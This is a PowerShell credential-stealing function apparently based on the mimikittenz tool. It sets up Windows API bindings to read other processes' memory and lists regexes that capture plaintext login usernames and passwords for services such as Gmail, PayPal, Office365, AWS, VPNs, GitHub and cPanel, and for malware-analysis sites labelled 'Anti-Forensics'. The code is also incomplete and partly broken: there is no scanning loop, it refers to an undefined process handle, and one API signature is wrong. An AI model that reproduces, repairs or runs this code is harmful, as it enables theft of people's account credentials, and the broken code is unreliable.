function Get-CredsFromMemory {    
    
    $AssemblyName = New-Object Reflection.AssemblyName -ArgumentList 'mimikittenz'
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($AssemblyName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemory', $false)

    $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
    $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())

    try { $AllocationProtect = [AllocationProtect] } catch [Management.Automation.RuntimeException] {
        $EnumBuilder = $ModuleBuilder.DefineEnum('AllocationProtect', 'Public', [UInt32])
        [void]$EnumBuilder.DefineLiteral('PAGE_EXECUTE', [UInt32]0x10)
        [void]$EnumBuilder.DefineLiteral('PAGE_EXECUTE_READ', [UInt32]0x20)
        [void]$EnumBuilder.DefineLiteral('PAGE_EXECUTE_READWRITE', [UInt32]0x40)
        [void]$EnumBuilder.DefineLiteral('PAGE_EXECUTE_WRITECOPY', [UInt32]0x80)
        [void]$EnumBuilder.DefineLiteral('PAGE_NOACCESS', [UInt32]0x01)
        [void]$EnumBuilder.DefineLiteral('PAGE_READONLY', [UInt32]0x02)
        [void]$EnumBuilder.DefineLiteral('PAGE_READWRITE', [UInt32]0x04)
        [void]$EnumBuilder.DefineLiteral('PAGE_WRITECOPY', [UInt32]0x08)
        [void]$EnumBuilder.DefineLiteral('PAGE_GUARD', [UInt32]0x100)
        [void]$EnumBuilder.DefineLiteral('PAGE_NOCACHE', [UInt32]0x200)
        [void]$EnumBuilder.DefineLiteral('PAGE_WRITECOMBINE', [UInt32]0x400)
        [void]$EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        $AllocationProtect = $EnumBuilder.CreateType()
    }

    try { $PageState = [PageState] } catch [Management.Automation.RuntimeException] {
        $EnumBuilder = $ModuleBuilder.DefineEnum('PageState', 'Public', [UInt32])
        [void]$EnumBuilder.DefineLiteral('MEM_COMMIT', [UInt32]0x1000)
        [void]$EnumBuilder.DefineLiteral('MEM_FREE', [UInt32]0x10000)
        [void]$EnumBuilder.DefineLiteral('MEM_RESERVE', [UInt32]0x2000)
        [void]$EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        $PageState = $EnumBuilder.CreateType()
    }

    try { $PageType = [PageType] } catch [Management.Automation.RuntimeException] {
        $EnumBuilder = $ModuleBuilder.DefineEnum('PageType', 'Public', [UInt32])
        [void]$EnumBuilder.DefineLiteral('MEM_IMAGE', [UInt32]0x1000000)
        [void]$EnumBuilder.DefineLiteral('MEM_MAPPED', [UInt32]0x40000)
        [void]$EnumBuilder.DefineLiteral('MEM_PRIVATE', [UInt32]0x20000)
        [void]$EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        $PageType = $EnumBuilder.CreateType()
    }

    try { $SYSTEM_INFO = [SYSTEM_INFO] } catch [Management.Automation.RuntimeException] {
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $StructBuilder = $ModuleBuilder.DefineType('SYSTEM_INFO', $Attributes, [ValueType])
        [void]$StructBuilder.DefineField('ProcessorArchitecture', [UInt16], 'Public')
        [void]$StructBuilder.DefineField('Reserved', [UInt16], 'Public')
        [void]$StructBuilder.DefineField('PageSize', [UInt32], 'Public')
        [void]$StructBuilder.DefineField('MinimumApplicationAddress', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('MaximumApplicationAddress', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('ActiveProcessorMask', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('NumberOfProcessors', [UInt32], 'Public')
        [void]$StructBuilder.DefineField('ProcessorType', [UInt32], 'Public')
        [void]$StructBuilder.DefineField('AllocationGranularity', [UInt32], 'Public')
        [void]$StructBuilder.DefineField('ProcessorLevel', [UInt16], 'Public')
        [void]$StructBuilder.DefineField('ProcessorRevision', [UInt16], 'Public')
        $SYSTEM_INFO = $StructBuilder.CreateType()
    }

    try { $MEMORY_BASIC_INFORMATION = [MEMORY_BASIC_INFORMATION] } catch [Management.Automation.RuntimeException] {
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $StructBuilder = $ModuleBuilder.DefineType('MEMORY_BASIC_INFORMATION', $Attributes, [ValueType])
        [void]$StructBuilder.DefineField('ProcessorArchitecture', [UInt16], 'Public')
        [void]$StructBuilder.DefineField('BaseAddress', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('AllocationBase', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('AllocationProtect', [UInt32], 'Public')
        [void]$StructBuilder.DefineField('Alignment', [UInt16], 'Public')
        [void]$StructBuilder.DefineField('RegionSize', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('State', $PageState, 'Public')
        [void]$StructBuilder.DefineField('Protect', $AllocationProtect, 'Public')
        [void]$StructBuilder.DefineField('Type', $PageType, 'Public')
        [void]$StructBuilder.DefineField('Alignment2', [UInt16], 'Public')
        $MEMORY_BASIC_INFORMATION = $StructBuilder.CreateType()
    }

    try { $MEMORY_BASIC_INFORMATION32 = [MEMORY_BASIC_INFORMATION32] } catch [Management.Automation.RuntimeException] {
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $StructBuilder = $ModuleBuilder.DefineType('MEMORY_BASIC_INFORMATION32', $Attributes, [ValueType])
        [void]$StructBuilder.DefineField('BaseAddress', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('AllocationBase', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('AllocationProtect', [UInt32], 'Public')
        [void]$StructBuilder.DefineField('RegionSize', [IntPtr], 'Public')
        [void]$StructBuilder.DefineField('State', $PageState, 'Public')
        [void]$StructBuilder.DefineField('Protect', $AllocationProtect, 'Public')
        [void]$StructBuilder.DefineField('Type', $PageType, 'Public')
        $MEMORY_BASIC_INFORMATION32 = $StructBuilder.CreateType()
    }

    $TypeBuilder = $ModuleBuilder.DefineType('kernel32', 'Public, Class')
    
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('kernel32.dll'), [Reflection.FieldInfo[]]@($SetLastError), @($True))

    $MethodAttributes = [Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static
    $Standard = [Reflection.CallingConventions]::Standard
    $WinApi = [Runtime.InteropServices.CallingConvention]::Winapi

    # OpenProcess
    $MethodParams = [Type[]]@([Int32], [Bool], [Int32])
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('OpenProcess', 'kernel32.dll', $MethodAttributes, $Standard, [IntPtr], $MethodParams, $WinApi, [Runtime.InteropServices.CharSet]::Auto)    
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # CloseHandle
    $MethodParams = [Type[]]@([IntPtr])
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CloseHandle', 'kernel32.dll', $MethodAttributes, $Standard, [Bool], $MethodParams, $WinApi, [Runtime.InteropServices.CharSet]::Auto)    
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # ReadProcessMemory
    $MethodParams = [Type[]]@([IntPtr], [IntPtr], [byte[]], [Int64], [Int64].MakeByRefType())
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('ReadProcessMemory', 'kernel32.dll', $MethodAttributes, $Standard, [Bool], $MethodParams, $WinApi, [Runtime.InteropServices.CharSet]::Auto)    
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # VirtualQueryEx
    $MethodParams = [Type[]]@([IntPtr], [IntPtr], [byte[]], [Int64], [Int64].MakeByRefType())
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VirtualQueryEx', 'kernel32.dll', $MethodAttributes, $Standard, [Int64], $MethodParams, $WinApi, [Runtime.InteropServices.CharSet]::Auto)    
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    
    # GetSystemInfo
    $MethodParams = [Type[]]@([SYSTEM_INFO].MakeByRefType())
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('GetSystemInfo', 'kernel32.dll', $MethodAttributes, $Standard, [void], $MethodParams, $WinApi, [Runtime.InteropServices.CharSet]::Auto)
    
    # IsWow64Process
    $MethodParams = [Type[]]@([IntPtr], [Bool].MakeByRefType())
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('IsWow64Process', 'kernel32.dll', $MethodAttributes, $Standard, [Bool], $MethodParams, $WinApi, [Runtime.InteropServices.CharSet]::Auto)
    
    $Kernel32 = $TypeBuilder.CreateType()

    $PROCESS_VM_READ = 0x0010
    $PROCESS_QUERY_INFORMATION = 0x00000400

    $SystemInfo = [Activator]::CreateInstance([SYSTEM_INFO])
    $Kernel32::GetSystemInfo([ref]$SystemInfo)
    $Wow64 = $false
    
    # If not x86 processor, check for Wow64
    if ($SystemInfo.ProcessorArchitecture -ne 0) { 
        $Kernel32::IsWow64Process($ProcessHandle, [ref]$Wow64) 
        
        if ($Wow64) { 
        
        }
    }

    
    
    
    
    
    
    $Regexes = @{}
    
    # Gmail
    $Regexes.Add('Gmail', [regex]'&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=')

    # Web Services
    $Regexes.Add('Dropbox', [regex]'login_email=.{1,99}&login_password=.{1,99}&')
    $Regexes.Add('Office365', [regex]'login=.{1,32}&passwd=.{1,22}&PPSX=')
    $Regexes.Add('OneDrive', [regex]'login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT=')
    $Regexes.Add('PayPal', [regex]'login_email=.{1,48}&login_password=.{1,16}&submit=Log\+In&browser_name')
    $Regexes.Add('AWS', [regex]'&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=')
    $Regexes.Add('OWA', [regex]'&username=.{1,48}&password=.{1,48}&passwordText')
    $Regexes.Add('Slack', [regex]'&crumb=.{1,70}&email=.{1,50}&password=.{1,48}')
    $Regexes.Add('CitrixOnline', [regex]'emailAddress=.{1,50}&password=.{1,50}&submit')

    # Accounting
    $Regexes.Add('Xerox', [regex]'fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken=')
    $Regexes.Add('MYOB', [regex]'UserName=.{1,50}&Password=.{1,50}&RememberMe=')

    # SSL VPN's
    $Regexes.Add('JuniperSSLVPN', [regex]'tz_offset=-.{1,6}&username=.{1,22}&password=.{1,22}&realm=.{1,22}&btnSubmit=')

    # Social Media
    $Regexes.Add('Twitter', [regex]'username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=')
    $Regexes.Add('Facebook', [regex]'lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=')
    $Regexes.Add('LinkedIn', [regex]'session_key=.{1,50}&session_password=.{1,50}&isJsEnabled')

    # Anti-Forensics
    $Regexes.Add('Malwr', [regex]'&username=.{1,32}&password=.{1,22}&next=')
    $Regexes.Add('VirusTotal', [regex]'password=.{1,22}&username=.{1,42}&next=%2Fen%2F&response_format=json')
    $Regexes.Add('AnubisLabs', [regex]'username=.{1,42}&password=.{1,22}&login=login')

    # Remote Access
    $Regexes.Add('CitrixNetScaler', [regex]'login=.{1,22}&passwd=.{1,42}')
    $Regexes.Add('RDPWeb', [regex]'DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType')
    
    # Dev Related
    $Regexes.Add('JIRA', [regex]'username=.{1,50}&password=.{1,50}&rememberMe')
    $Regexes.Add('Redmine', [regex]'username=.{1,50}&password=.{1,50}&login=Login')
    $Regexes.Add('Github', [regex]'%3D%3D&login=.{1,50}&password=.{1,50}')
    $Regexes.Add('BugZilla', [regex]'Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}')
    $Regexes.Add('Zendesk', [regex]'user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}')
    $Regexes.Add('Cpanel', [regex]'user=.{1,50}&pass=.{1,50}')

}